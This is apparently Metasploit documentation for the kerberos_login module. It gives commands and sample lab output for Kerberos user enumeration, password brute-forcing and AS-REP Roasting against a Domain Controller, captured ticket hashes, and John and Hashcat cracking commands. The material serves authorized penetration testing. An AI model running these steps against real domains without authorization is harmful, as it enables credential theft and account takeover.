## Vulnerable Application

This module will test Kerberos logins on a range of machines and
report successful logins.  If you have loaded a database plugin
and connected to a database this module will record successful
logins and hosts so you can track your access.

Kerberos accounts which do not require pre-authentication will
have the TGT logged, this technique is known as AS-REP Roasting.

It is also able to identify whether user accounts are enabled or disabled/locked out.

## Verification Steps

When verifying the module in the listed examples, it is recommended to test the following accounts:

- Valid account
- Invalid account
- Locked/Disabled account
- Account with spaces
- AS-REP Roastable accounts

## Target

To use kerberos_login, make sure you are able to connect to the
Kerberos service on a Domain Controller.

## Scenarios

### Creating a single Kerberos ticket (TGT)

To create a single Kerberos ticket (TGT), set the username and password options:

```
msf6 auxiliary(scanner/kerberos/kerberos_login) > run rhost=192.168.123.133 domain=DEMO.local username=basic_user password=password verbose=true
[*] Using domain: DEMO.LOCAL - 192.168.123.133:88   ...
[+] 192.168.123.133 - User found: "basic_user" with password password. Hash: $krb5asrep$23$basic_user@DEMO.LOCAL:96d685b85a51e26dbc762c4aa7754d77$ded0e24ef0cef8ffa214cb9c9667ae90d80def77f91c3297be549aab9f4a1235997f3dd8dd70a970838085f94dcb4ec3620232e8c6fc9b192626cc18638f6909dbd582a59e096eb933f9796f869334c1f3bb1440d93484b1870eb626aa6a57801e7a950b6b9839a49f290487e21f5524958006ceb30dad63e88441fb7e49d7b1d81213b022c5b664cf6b93f8f60f0d074a32c11b75878431949dd3d75bcf824f154ef5d6e25036175524a7fac08df5f4be9720ce323dd92973ea3cd8566b85fa57293d15583b0382a587ca660696a85430fa06019d5e42f6650f14c6b74bfdb7450a74045f233a
[*] Auxiliary module execution completed
```

### Auth Brute

The following demonstrates basic usage, using a custom wordlist,
targeting a single Domain Controller to identify valid domain user
accounts and additionally bruteforcing passwords:

Create a new `./users.txt` file and `./wordlist.txt`, then run the module:

```
msf6 auxiliary(gather/kerberos_enumusers) > rerun rhost=192.168.123.133 domain=DEMO.local user_file=./users.txt pass_file=./wordlist.txt verbose=true
[*] Reloading module...

[*] Using domain: DEMO.LOCAL - 192.168.123.133:88   ...
[+] 192.168.123.133 - User: "basic_user" is present
[*] 192.168.123.133 - User: "basic_user" wrong password invalid2
[*] 192.168.123.133 - User: "basic_user" wrong password p4$$w0rd
[*] 192.168.123.133 - User: "basic_user" wrong password test_password
[+] 192.168.123.133 - User found: "basic_user" with password password. Hash: $krb5asrep$23$basic_user@DEMO.LOCAL:959b983f9cffc093002d9cd8a20...etc...
[*] 192.168.123.133 - User: "foo" user not found
[*] 192.168.123.133 - User: "foo_bar" user not found
[+] 192.168.123.133 - User: "Administrator" is present
[*] 192.168.123.133 - User: "Administrator" wrong password invalid2
[*] 192.168.123.133 - User: "Administrator" wrong password p4$$w0rd
[*] 192.168.123.133 - User: "Administrator" wrong password test_password
[*] 192.168.123.133 - User: "Administrator" wrong password password
[+] 192.168.123.133 - User: "no_pre_auth" does not require preauthentication. Hash: $krb5asrep$23$no_pre_auth@DEMO.LOCAL:a714f0553589cbd78...etc...
[+] 192.168.123.133 - User: "admin" is present
[*] 192.168.123.133 - User: "admin" wrong password invalid2
[*] 192.168.123.133 - User: "admin" - Kerberos Error - KDC_ERR_KEY_EXPIRED (23) - Password has expired - change password to reset
[*] 192.168.123.133 - User: "admin" wrong password test_password
[*] 192.168.123.133 - User: "admin" wrong password password
[*] Auxiliary module execution completed
```

### ASREPRoast Cracking

Accounts that have `Do not require Kerberos preauthentication` enabled, will receive an ASREP response with a ticket present.
The technique of cracking this token offline is called ASREPRoasting.

Cracking ASREP response with John:

```
john ./hashes.txt --wordlist=./wordlist.txt --format:krb5asrep
```

Cracking ASREP response with Hashcat:

```
hashcat -m 18200 -a 0 ./hashes.txt ./wordlist.txt
```

You can see previously creds with:

```
creds -v
```

## Options

The `kerberos_login` module only requires the `RHOST`, `DOMAIN` and
`USER_FILE` options to run.

**The DOMAIN option**

This option is used to specify the target domain. If the domain name is
incorrect an error is returned and domain user account enumeration will fail.

An example of setting DOMAIN:

```
set DOMAIN [domain name]
```

**The USER_FILE option**

This option is used to specify the file containing a list of user names
to query the Domain Controller to identify if they exist in the target domain
or not. One per line.

An example of setting USER_FILE:

```
set USER_FILE [path to file]
```

**The PASS_FILE option**

If you happen to manage all the found passwords in a separate file, then this option would be
suitable for that. One per line.

```
set PASS_FILE [path to file]
```

**The USERPASS_FILE option**

If each user should be using a specific password in your file, then you can use this option. One
username/password per line:

```
set USERPASS_FILE [path to file]
```

**The DB_ALL_CREDS option**

This option allows you to reuse all the user names and passwords collected by the database:

```
set DB_ALL_CREDS true
```

**The DB_ALL_PASS option**

This option allows you to reuse all the passwords collected by the database.

```
set DB_ALL_PASS true
```

**The DB_ALL_USERS option**

This option allows you to reuse all the user names collected by the database.

```
set DB_ALL_USERS true
```

**The Timeout option**

This option is used to specify the TCP timeout i.e. the time to wait
before a connection to the Domain Controller is established and data read.

An example of setting Timeout:

```
set Timeout [value in seconds]
```
